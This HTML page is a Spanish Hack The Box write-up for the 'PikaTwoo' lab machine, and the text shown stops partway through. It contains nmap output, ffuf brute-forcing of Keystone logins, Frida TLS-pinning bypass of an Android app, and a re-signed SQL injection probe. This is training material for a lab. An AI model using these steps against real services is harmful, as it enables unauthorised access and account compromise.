<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Writeup HTB : PikaTwoo</title>

  <meta name="author" content="Rug4lo">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Writeup">
  <meta name="twitter:description" content="Resolución de la máquina MYEXPENSE">
  <meta name="twitter:creator" content="Rug4lo">  
  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/forest.png" />

  <meta property="og:site_name" content="Rug4lo" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Writeup">
  <meta property="og:description" content="Resolución de la máquina MYEXPENSE">
  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/forest.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/htb/PikaTwoo/logo2.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Forest" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover1.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="Rug4lo">
          <h1 class="panel-cover__title panel-title scale-up-center">Rug4lo</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Hacker | Red teamer | Pentester</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/htb" title="Rug4lo" class="blog-button">HTB</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/Rug4lo" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://www.linkedin.com/in/ruben-garcia-lopez-055496279/" title="Linkedin" target="_blank">
                  <i class="icon icon-social-linkedin"></i>
                  <span class="label">Linkedin</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:rubengarciavalladolid@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>
            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#reconocimiento">Reconocimiento</a></li>
        <li><a href="#keystone">Explotación del Keystone</a></li>
        <li><a href="#appdownload">Descarga de la appp</a></li>
        <li><a href="#apprecon">Reconocimiento de la app</a></li>
        <li><a href="#ssl">Bypass del certificado SSL con Frida</a></li>
        <li><a href="#signature">Bypass de la firma del certificado</a></li>
        <li><a href="#sqli">SQLI al loggin de la app</a></li>
        <li><a href="#apisix">Explotación de APISIX para conseguir la contraseña</a></li>
        <li><a href="#passreset">Abuso del apartado Password Reset</a></li>
        <li><a href="#lfi">Explotación del LFI</a></li>
        <li><a href="#rce">Paso de LFI a RCE usando nginx</a></li>
        <li><a href="#continer">Explotacion de Kubernetes y APISIX para salir del contenedor</a></li>
        <li><a href="#privesc">Escalada de privilegios</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Hack the box</h4>
    <h2 class="post-title">PikaTwoo</h2><br>
    <picture><img src="/htb/PikaTwoo/logo.png" style="margin-right:700px; margin-left:0px; height:71px;" class="include_image zoomable"/></picture>
  </header>
  
<section class="post" id="reconocimiento">
<br><h3 class="post-title">Reconocimiento</h3><br>

<p class="plain-text">Primero que todo vamos a empezar con el escaneo básico de <code class="language-plaintext highlighter-rouge">nmap</code> para ver los puertos abiertos </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nmap </span><span class="p">-p- --open -sS -min-rate 5000 -vvv -n -Pn -oN allPorts2 10.10.11.199

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-12 19:39 CEST
Initiating SYN Stealth Scan at 19:39
Scanning 10.10.11.199 [65535 ports]
Discovered open port 443/tcp on 10.10.11.199
Discovered open port 22/tcp on 10.10.11.199
Discovered open port 80/tcp on 10.10.11.199
Discovered open port 8080/tcp on 10.10.11.199
Discovered open port 35357/tcp on 10.10.11.199
Discovered open port 5672/tcp on 10.10.11.199
Discovered open port 4369/tcp on 10.10.11.199
Discovered open port 5000/tcp on 10.10.11.199
Discovered open port 25672/tcp on 10.10.11.199
Completed SYN Stealth Scan at 19:39, 16.56s elapsed (65535 total ports)
Nmap scan report for 10.10.11.199
Host is up, received user-set (0.36s latency).
Scanned at 2023-10-12 19:39:12 CEST for 17s
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 63
80/tcp    open  http         syn-ack ttl 63
443/tcp   open  https        syn-ack ttl 63
4369/tcp  open  epmd         syn-ack ttl 63
5000/tcp  open  upnp         syn-ack ttl 63
5672/tcp  open  amqp         syn-ack ttl 63
8080/tcp  open  http-proxy   syn-ack ttl 63
25672/tcp open  unknown      syn-ack ttl 63
35357/tcp open  openstack-id syn-ack ttl 63</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora vamos a usar los scripts básicos de reconocimiento para ver mas información de estos puertos </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nmap </span><span class="p">-sCV -p22,80,443,4369,5000,5672,8080,25672,35357 10.10.11.199 -oN Targeted

# Nmap 7.93 scan initiated Thu Oct 12 19:02:07 2023 as: nmap -sCV -p22,80,443,4369,5000,5672,8080,25672,35357 -oN Targeted 10.10.11.199
WARNING: Service 10.10.11.199:5000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.10.11.199
Host is up (0.24s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 f3922dfd8422d78df6b09e788eb93be7 (RSA)
|   256 01e43ec06643df25af8a71b83906df9f (ECDSA)
|_  256 4fec39764e719471befa7ffaa6a81674 (ED25519)
80/tcp    open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Pikaboo
|_http-cors: HEAD GET POST PUT DELETE PATCH
443/tcp   open  ssl/http nginx 1.18.0
| ssl-cert: Subject: commonName=api.pokatmon-app.htb/organizationName=Pokatmon Ltd/stateOrProvinceName=United Kingdom/countryName=UK
| Not valid before: 2021-12-29T20:33:08
|_Not valid after:  3021-05-01T20:33:08
| tls-alpn: 
|_  http/1.1
|_http-server-header: APISIX/2.10.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| tls-nextprotoneg: 
|_  http/1.1
4369/tcp  open  epmd     Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
5000/tcp  open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-195255c3-658b-44fc-ae95-c602a1893b72
|     &lt!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     &lttitle>404 Not Found&lt/title>
|     &lth1>Not Found&lt/h1>
|     &ltp>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 300 MULTIPLE CHOICES
|     Content-Type: application/json
|     Location: http://pikatwoo.pokatmon.htb:5000/v3/
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-10e3a45c-8a1f-46cc-82dc-94332d78de7d
|     {"versions": {"values": [{"id": "v3.14", "status": "stable", "updated": "2020-04-07T00:00:00Z", "links": [{"rel": "self", "href": "http://pikatwoo.pokatmon.htb:5000/v3/"
}], "media-types": [{"base": "application/json", "type": "application/vnd.openstack.identity-v3+json"}]}]}}
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-d0366dc1-c99b-4be6-b65e-a258c99ac306
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-55813e0c-ce41-4c9f-85df-6fd8e088f192
|   SIPOptions: 
|_    SIP/2.0 200 OK
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
5672/tcp  open  amqp     RabbitMQ 3.8.9 (0-9)
| amqp-info: 
|   capabilities: 
|     publisher_confirms: YES
|     exchange_exchange_bindings: YES
|     basic.nack: YES
|     consumer_cancel_notify: YES
|     connection.blocked: YES
|     consumer_priorities: YES
|     authentication_failure_close: YES
|     per_consumer_qos: YES
|     direct_reply_to: YES
|   cluster_name: rabbit@pikatwoo.pokatmon.htb
|   copyright: Copyright (c) 2007-2020 VMware, Inc. or its affiliates.
|   information: Licensed under the MPL 2.0. Website: https://rabbitmq.com
|   platform: Erlang/OTP 23.2.6
|   product: RabbitMQ
|   version: 3.8.9
|   mechanisms: AMQPLAIN PLAIN
|_  locales: en_US
8080/tcp  open  http     nginx 1.18.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0
25672/tcp open  unknown
35357/tcp open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-title: Site doesn't have a title (application/json).
|_Requested resource was http://10.10.11.199:35357/v3/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.93%I=7%D=10/12%Time=65282698%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,1DC,"HTTP/1\.0\x20300\x20MULTIPLE\x20CHOICES\r\nContent-Type:
SF:\x20application/json\r\nLocation:\x20http://pikatwoo\.pokatmon\.htb:500
SF:0/v3/\r\nVary:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-10e3a4
SF:5c-8a1f-46cc-82dc-94332d78de7d\r\n\r\n{\"versions\":\x20{\"values\":\x2
SF:0\[{\"id\":\x20\"v3\.14\",\x20\"status\":\x20\"stable\",\x20\"updated\"
SF::\x20\"2020-04-07T00:00:00Z\",\x20\"links\":\x20\[{\"rel\":\x20\"self\"
SF:,\x20\"href\":\x20\"http://pikatwoo\.pokatmon\.htb:5000/v3/\"}\],\x20\"
SF:media-types\":\x20\[{\"base\":\x20\"application/json\",\x20\"type\":\x2
SF:0\"application/vnd\.openstack\.identity-v3\+json\"}\]}\]}}")%r(RTSPRequ
SF:est,AC,"RTSP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20charse
SF:t=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nVary:\x20X-Auth-Token\
SF:r\nx-openstack-request-id:\x20req-55813e0c-ce41-4c9f-85df-6fd8e088f192\
SF:r\n\r\n")%r(HTTPOptions,AC,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20
SF:text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nVa
SF:ry:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-d0366dc1-c99b-4be
SF:6-b65e-a258c99ac306\r\n\r\n")%r(FourOhFourRequest,180,"HTTP/1\.0\x20404
SF:\x20NOT\x20FOUND\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVar
SF:y:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-195255c3-658b-44fc
SF:-ae95-c602a1893b72\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\
SF:x20HTML\x203\.2\x20Final//EN\">\n&lttitle>404\x20Not\x20Found&lt/title>\n&lth
SF:1>Not\x20Found&lt/h1>\n&ltp>The\x20requested\x20URL\x20was\x20not\x20found\
SF:x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manua
SF:lly\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.&lt/p>
SF:\n")%r(SIPOptions,12,"SIP/2\.0\x20200\x20OK\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 12 19:04:48 2023 -- 1 IP address (1 host up) scanned in 160.88 seconds</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos ver que tiene un par de subdominios, los cuales voy a añadir al <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
<a href="/htb/PikaTwoo/1.png" target="_blank"><div><p><img src="/htb/PikaTwoo/1.png"></p></div></a>

<p class="plain-text">Si hacemos un reconocimiento de directorios podremos ver alguna cosa interesante.</p>
<a href="/htb/PikaTwoo/2.png" target="_blank"><div><p><img src="/htb/PikaTwoo/2.png"></p></div></a>

<p class="plain-text">Podemos también hacer un reconocimiento del puerto <code class="language-plaintext highlighter-rouge">8080</code>, en el cual encontraremos un /info, que tendrá esta información</p>
<a href="/htb/PikaTwoo/3.png" target="_blank"><div><p><img src="/htb/PikaTwoo/3.png"></p></div></a>

<p class="plain-text">Si nos metemos a la pagina principal, podemos clicar en uno de los monstruos</p>
<a href="/htb/PikaTwoo/4.png" target="_blank"><div><p><img src="/htb/PikaTwoo/4.png"></p></div></a>

<p class="plain-text">Pero si entramos nos encontramos con este error:</p>
<a href="/htb/PikaTwoo/5.png" target="_blank"><div><p><img src="/htb/PikaTwoo/5.png"></p></div></a>

<p class="plain-text">Si usamos <code class="language-plaintext highlighter-rouge">Dirbuster</code> para listar los directorios de la pagina principal, en donde encontraremos un <code class="language-plaintext highlighter-rouge">CHANGELOG</code>, que si nos lo descargamos veremos esto:</p>
<a href="/htb/PikaTwoo/6.png" target="_blank"><div><p><img src="/htb/PikaTwoo/6.png"></p></div></a>

<p class="plain-text">Con esto podemos ver que tiene una aplicación en android en beta</p>

<section class="post" id="keystone">
<br><h3 class="post-title">Explotación del Keystone</h3><br>

<p class="plain-text">Bien, una vez que hemos reunido esta información podemos ir a comprobar para que sirve el puerto 5000, que normalmente se usa para el servicio <code class="language-plaintext highlighter-rouge">Keystone</code></p>
<p class="plain-text">Fuente --> <a href="https://docs.openstack.org/install-guide/firewalls-default-ports.html">Openstack</a></p>

<p class="plain-text">Si indagamos en este servicio veremos que tiene una vulnerabilidad que nos puede ser de utilidad</p>
<p class="plain-text">CVE --> <a href=" https://bugs.launchpad.net/keystone/+bug/1688137">1688137</a></p>

<p class="plain-text">Esto nos dice que si mandamos peticiones por post a /v3/auth/tokens con esa data podemos conseguir la <code class="language-plaintext highlighter-rouge">Token</code> del usuario, para esto hay que mandar varias peticiones, por lo cual vamos hacernos un script en bash que nos automatize este proceso:</p>
<a href="/htb/PikaTwoo/7.png" target="_blank"><div><p><img src="/htb/PikaTwoo/7.png"></p></div></a>

<p class="plain-text">Cuando lo ejecutemos veremos que en uno de los errores esta el token del usuario admin (recordando que en el script hemos puesto que de usuario sea el admin)</p>
<a href="/htb/PikaTwoo/8.png" target="_blank"><div><p><img src="/htb/PikaTwoo/8.png"></p></div></a>

<p class="plain-text">Ahora que tenemos el id del usuario admin podemos usar <code class="language-plaintext highlighter-rouge">ffuf</code> para ver si hay mas usuarios, para esto usaremos una secuencia del 1 al 10 que definiremos en <code class="language-plaintext highlighter-rouge">F1</code> y como <code class="language-plaintext highlighter-rouge">F2</code> pondremos la lista de nombres a probar, en mi caso usare una lista de SecLists </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ./ffuf </span><span class="p">-u http://10.10.11.199:5000/v3/auth/tokens -H "Content-type: application/json" -w <(seq 0 10):F1,/opt/SecLists/Usernames/Names/names.txt:F2 -d '{ "auth": {"identity": {"methods": ["password"], "password": {"user": { "name": "F2","domain": { "id": "default" },"password": "fake_passwordF1" } } } } }' -ac
________________________________________________

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.11.199:5000/v3/auth/tokens
 :: Wordlist         : F1: /proc/self/fd/12
 :: Wordlist         : F2: /opt/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/json
 :: Data             : { "auth": {"identity": {"methods": ["password"], "password": {"user": { "name": "F2","domain": { "id": "default" },"password": "fake_passwordF1" } } } } }
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5623ms]
    * F1: 7
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5662ms]
    * F1: 8
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5725ms]
    * F1: 9
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 6345ms]
    * F1: 10
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 4498ms]
    * F1: 9
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 4498ms]
    * F1: 8
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 4709ms]
    * F1: 5
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5355ms]
    * F1: 10
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5416ms]
    * F1: 7
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5471ms]
    * F1: 6
    * F2: andrew</span>
</code></pre></div></div><br>

<p class="plain-text">Encontramos que hay un usuario llamado <code class="language-plaintext highlighter-rouge">Andrew</code> también.</p>
<p class="plain-text">Si nos ponemos a investigar en la pagina oficial veremos que este servicio suele usar un proxy llamado <code class="language-plaintext highlighter-rouge">Swift</code>, en el cual podemos usar el usuario que hemos conseguido</p>
<a href="/htb/PikaTwoo/9.png" target="_blank"><div><p><img src="/htb/PikaTwoo/9.png"></p></div></a>

<p class="plain-text">Probamos a hacer un curl a esta dirección y veremos que existe pero que no podemos acceder, esto nos deja saber que este directorio existe</p>
<a href="/htb/PikaTwoo/10.png" target="_blank"><div><p><img src="/htb/PikaTwoo/10.png"></p></div></a>

<p class="plain-text">Viendo que ese directorio existe, podemos probar a listar los directorios de esta nueva ruta, a ver si tenemos algo interesante, por lo que voy a usar la herramienta <code class="language-plaintext highlighter-rouge">Feroxbuster</code> </p>
<a href="/htb/PikaTwoo/11.png" target="_blank"><div><p><img src="/htb/PikaTwoo/11.png"></p></div></a>

<section class="post" id="appdownload">
<br><h3 class="post-title">Descarga de la appp</h3><br>

<p class="plain-text">Perfecto tenemos un /android, que junto a la información del <code class="language-plaintext highlighter-rouge">CHANGELOG</code> que hemos visto antes nos da la idea de que por ahí puede ir la explotación, si entramos a esta pagina veremos esto: </p>
<a href="/htb/PikaTwoo/12.png" target="_blank"><div><p><img src="/htb/PikaTwoo/12.png"></p></div></a>

<p class="plain-text">Podemos descargarnos el apk con un wget </p>
<a href="/htb/PikaTwoo/13.png" target="_blank"><div><p><img src="/htb/PikaTwoo/13.png"></p></div></a>

<p class="plain-text">Ahora que tenemos el apk en nuestro equipo </p>
<p class="plain-text">podemos debugearla con este comando, para ver los archivos internos </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ apktool </span><span class="p">d pokatmon-app.apk</span></code></pre></div></div><br>

<p class="plain-text">Con esto conseguiremos una carpeta con los archivos internos de la app, ahora podemos <code class="language-plaintext highlighter-rouge">Virtualizar</code> el android, para probar la apk </p>
<p class="plain-text">Para esto usaremos Genymotion </p>
<a href="/htb/PikaTwoo/14.png" target="_blank"><div><p><img src="/htb/PikaTwoo/14.png"></p></div></a>

<p class="plain-text">En mi caso ya tengo creado el móvil a virtualizar, pero para crearlo es simplemente darle al + y dejar todo por defecto, una vez que tengamos el Android corriendo podemos simplemente arrastrar el apk en el android para pasarle la apk </p>
<a href="/htb/PikaTwoo/15.png" target="_blank"><div><p><img src="/htb/PikaTwoo/15.png"></p></div></a>

<p class="plain-text">Ahora si ejecutamos la app veremos algo interesante, nos pide un correo y un código, los cuales no tenemos </p>
<a href="/htb/PikaTwoo/16.png" target="_blank"><div><p><img src="/htb/PikaTwoo/16.png"></p></div></a>

<section class="post" id="apprecon">
<br><h3 class="post-title">Reconocimiento de la app</h3><br>

<p class="plain-text">Ya que todo esto esta corriendo en local podemos probar interceptando la peticion con <code class="language-plaintext highlighter-rouge">Wireshark</code>, veremos a donde esta tratando de mandar la solicitud (api.pokatmon-app.htb) </p>
<a href="/htb/PikaTwoo/17.png" target="_blank"><div><p><img src="/htb/PikaTwoo/17.png"></p></div></a>

<p class="plain-text">Siendo ese el caso podemos intentar que nos mande a nosotros la peticion, modificando el /etc/hosts del android, para eso primero nos conectamos con <code class="language-plaintext highlighter-rouge">adb</code>, para tener una consola del movil </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ adb </span><span class="p">shell</span></code></pre></div></div><br>

<p class="plain-text">Ahora usamos este comando </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ mount </span><span class="p">-o remount,rw /</span></code></pre></div></div><br>

<p class="plain-text">Y modificamos el /etc/hosts con nuestra ip </p>
<a href="/htb/PikaTwoo/18.png" target="_blank"><div><p><img src="/htb/PikaTwoo/18.png"></p></div></a>

<p class="plain-text">como ahora la peticion sera hacia nosotros, podemos interceptarla con burpsuite, creamos un proxy que escuche por el puerto 8443 (no me dejaba por el 443) y que como destino lleve al puerto 443 de la maquina de htb </p>
<a href="/htb/PikaTwoo/19.png" target="_blank"><div><p><img src="/htb/PikaTwoo/19.png"></p></div></a>

<p class="plain-text">Ahora usamos este comando </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ socat </span><span class="p">TCP-LISTEN:443,fork,reuseaddr TCP:127.0.0.1:8443</span></code></pre></div></div><br>

<p class="plain-text">Una vez tenemos todo esto, podemos ver que si enviamos la peticion en el android, no nos llega en el <code class="language-plaintext highlighter-rouge">burpsuite</code>, esto es debido a que la peticion usa un certificado <code class="language-plaintext highlighter-rouge">ssl</code> que nosotros no tenemos, pero como esta aplicación esta corriendo en local, esta usando unos certificados ssl que tiene guardados dentro de la app, por lo que podemos usar frida para buscarlos </p>

<section class="post" id="ssl">
<br><h3 class="post-title">Bypass del certificado SSL con Frida</h3><br>

<p class="plain-text">Para esto nos descargamos la version de frida --> <a href="https://github.com/frida/frida/releases">Frida</a></p>

<p class="plain-text">Lo descomprimimos </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ 7z </span><span class="p">X frida-server-16.1.4-android-x86_64.xz</span></code></pre></div></div><br>

<p class="plain-text">Y le cambiamos el nombre </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ mv </span><span class="p">frida-server-16.1.4-android-x86_64 frida-server</span></code></pre></div></div><br>

<p class="plain-text">Ahora lo metemos en el móvil </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ adb </span><span class="p">push frida-server /data/local/tmp/</span></code></pre></div></div><br>

<p class="plain-text">Vamos a hacerlo ejecutable </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ adb </span><span class="p">shell "chmod 755 /data/local/tmp/frida-server"</span></code></pre></div></div><br>

<p class="plain-text">Y finalmente lo ejecutamos </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ adb </span><span class="p">shell "/data/local/tmp/frida-server &"</span></code></pre></div></div><br>

<p class="plain-text">Si todo esto esta bien hecho, podremos ejecutar este comando (dejando en segundo plano el anterior comando) </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ frida-ps </span><span class="p">-U</span></code></pre></div></div><br>

<p class="plain-text">Ahora podemos ver todos los procesos que esta corriendo el móvil, con esto hecho podemos empezar a bypasear el <code class="language-plaintext highlighter-rouge">ssl</code> el android, para probar la apk </p>
, para esto usaremos este script de frida </p>
<p class="plain-text">GitHub del script  --> <a href="https://github.com/NVISOsecurity/disable-flutter-tls-verification/blob/main/disable-flutter-tls.js">Flutter</a></p>

<p class="plain-text">Creamos un archivo <code class="language-plaintext highlighter-rouge">.js</code> en nuestro equipo con el contenido del script </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nvim </span><span class="p">flutter-disable-tls.js</span></code></pre></div></div><br>

<p class="plain-text">Ahora ejecutamos este script después de cerrar la aplicación Pokatmon, para que nos la vuelva abrir pero si importarle el certificado ssl </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ frida </span><span class="p">-U -l flutter-disable-tls.js -f htb.pokatmon.pokatmon_app</span></code></pre></div></div><br>

<p class="plain-text">Ahora si ponemos cualquier correo y código, podremos ver la peticion en burpsuite </p>
<a href="/htb/PikaTwoo/20.png" target="_blank"><div><p><img src="/htb/PikaTwoo/20.png"></p></div></a>

<section class="post" id="signature">
<br><h3 class="post-title">Bypass de la firma del certificado</h3><br>

<p class="plain-text">Esta es la peticion de burpsuite </p>
<a href="/htb/PikaTwoo/21.png" target="_blank"><div><p><img src="/htb/PikaTwoo/21.png"></p></div></a>

<p class="plain-text">Si desencriptamos la <code class="language-plaintext highlighter-rouge">firma</code>, veremos que no tiene nada especial, es una básica, pero cuando estuvimos viendo los archivos de la apk vimos una llave publica y una privada </p>
<a href="/htb/PikaTwoo/22.png" target="_blank"><div><p><img src="/htb/PikaTwoo/22.png"></p></div></a>

<p class="plain-text">Ahora ejecutamos este script después de cerrar la aplicación Pokatmon, para que nos la vuelva abrir pero si importarle el certificado ssl </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ openssl </span><span class="p">dgst -sha256 -sign private.pem <(echo -n "app_beta_mailaddr=hey@gmail.com'&app_beta_code=1234") | base64 -w 0 ; echo</span></code></pre></div></div><br>

<p class="plain-text">Finalmente nos esta dando otra tipo de respuesta </p>
<a href="/htb/PikaTwoo/23.png" target="_blank"><div><p><img src="/htb/PikaTwoo/23.png"></p></div></a>

<section class="post" id="sqli">
<br><h3 class="post-title">SQLI al loggin de la app</h3><br>

<p class="plain-text">Ahora podemos intentar una <code class="language-plaintext highlighter-rouge">inyeccion SQL</code> (todo lo que cambies en el mensaje se tiene que firmar otra vez) </p>
<a href="/htb/PikaTwoo/24.png" target="_blank"><div><p><img src="/htb/PikaTwoo/24.png"></p></div></a>

<p class="plain-text">Y nos da un email y un código!, si lo introducimos nos dara un error </p>
<a href="/htb/PikaTwoo/25.png" target="_blank"><div><p><img src="/htb/PikaTwoo/25.png"></p></div></a>

<p class="plain-text">Para solucionar esto tenemos que modificar el /etc/hosts de el android </p>
<a href="/htb/PikaTwoo/26.png" target="_blank"><div><p><img src="/htb/PikaTwoo/26.png"></p></div></a>

<p class="plain-text">Ahora si introducimos las credenciales, nos entrara a la app </p>
<a href="/htb/PikaTwoo/27.png" target="_blank"><div><p><img src="/htb/PikaTwoo/27.png"></p></div></a>

<section class="post" id="apisix">
<br><h3 class="post-title">Explotación de APISIX para conseguir la contraseña</h3><br>

<p class="plain-text">Aquí no tenemos nada, pero tenemos un correo, en la pagina principal había un apartado para recuperar la contraseña a traes del correo, si ponemos el correo y interceptamos al peticion con <code class="language-plaintext highlighter-rouge">burpsuite</code>, veremos que nos manda a un forbidden </p>
<a href="/htb/PikaTwoo/28.png" target="_blank"><div><p><img src="/htb/PikaTwoo/28.png"></p></div></a>

<p class="plain-text">Si modificamos un poco la peticion, veremos que nos da un token </p>
